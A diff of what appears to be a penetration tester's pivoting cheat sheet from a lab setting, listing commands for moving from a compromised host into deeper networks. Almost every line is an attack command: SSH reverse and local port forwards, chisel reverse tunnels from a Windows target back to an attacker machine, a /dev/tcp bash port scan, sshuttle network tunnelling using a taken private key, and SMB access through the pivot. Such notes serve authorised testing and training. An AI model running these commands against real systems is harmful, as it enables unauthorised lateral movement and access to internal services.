@@ -1,5 +1,6 @@
----------------------
-Linux Internal Services (from Target)
+===================================
+Linux Internal Services (From Target)
+
 tgt> netstat -nl 
 tgt> mysql -P 3306 -u root -p
 tgt> ssh -R 4444:127.0.0.1:3306 kali@192.168.162.46
@@ -12,14 +13,25 @@ mysql -u root -h 127.0.0.1 -P 4444
 vncviewer -passwd secret localhost:4444 
 firefox 127.0.0.1:4444
 
----------------------
-Linux Internal (from Kali)
-Requires access to bob w/password
+===================================
+Linux Internal Service
+From Kali, Requires access to bob w/password
+
 ssh -L 4444:127.0.0.1:5901 -N -f bob@192.168.200.5
 vncviewer -passwd secret localhost:4444 
 
----------------------
+
+===================================
+SSH Tunnel Port
+From Kali, to Bob, to Deeper-Target
+
+sudo ssh -N bob@10.0.0.251 -p22 -L 8080:10.1.1.1:80  
+firefox http://127.0.0.1:8080/ 
+
+
+===================================
 Easy Windows Chisel 
+
 netstat -nat | findstr LISTEN | findstr 127 
 127.0.0.1:8080 LISTENING 
 
@@ -33,13 +45,35 @@ kali> chisel-linux64 server --reverse --port 443  -v
 wind> chisel-amd64.exe client 192.168.162.46:443 R:8080:localhost:8080  
 kali> firefox 127.0.0.1:8080  
 
----------------------
+
+===================================
+Portscan (to Deeper Target)
+
+IP="$1"; for port in $(seq 1 65535); do (echo '.' >/dev/tcp/192.168.200.5/$port && echo "OPEN: $port" &) 2>/dev/null; done 
+
+
+===================================
+Tunnel the Whole-Network (Linux Target)
+
+sshuttle -r bob@10.0.0.251 10.1.1.0/24   
+sshuttle -r root@10.0.0.251 10.1.1.0/24 --ssh-cmd 'ssh -i ~/lab/bob/.ssh/id_rsa' 
+
+===================================
+SSH Tunnel Port (Linux Target)
+
+sudo ssh -N bob@10.0.0.251 -p22 -L 8080:10.1.1.1:80  
+firefox http://127.0.0.1:8080/ 
+
+
+
+===================================
 Windows-Chisel to Deeper-Windows
+
 kali> chisel-linux64 server --reverse --port 443 -v
 wind> chisel-amd64.exe client 192.168.162.46:443 R:127.0.0.1:3306:deeperbox:3306
 kali> mysql --host=127.0.0.1 --port=3306 --user=root -p
 
----------------------
+===================================
 Linux-Pivot to Deeper-Windows
 Found SMB on Remote Box
 Get access to the SMB on deeper box. 
@@ -54,5 +88,6 @@ min protocol = SMB2
 sudo /etc/init.d/smbd restart 
 smbclient -L 127.0.0.1 -U Administrator 
 
----------------------
-Consider: mxtransfer
+
+===================================
+Consider: mxtransfer mxpersist
